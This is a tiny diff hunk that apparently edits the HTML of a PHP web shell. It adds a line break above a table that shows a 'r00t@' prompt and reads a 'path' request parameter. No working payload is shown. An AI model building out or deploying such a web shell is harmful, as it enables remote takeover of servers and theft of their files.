@@ -100,7 +100,7 @@ border-radius:5px;
 </style>
 </head>
 <body>
-<br/>
+<br/><br/>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>r00t@ ';
 if(isset($_GET['path'])){
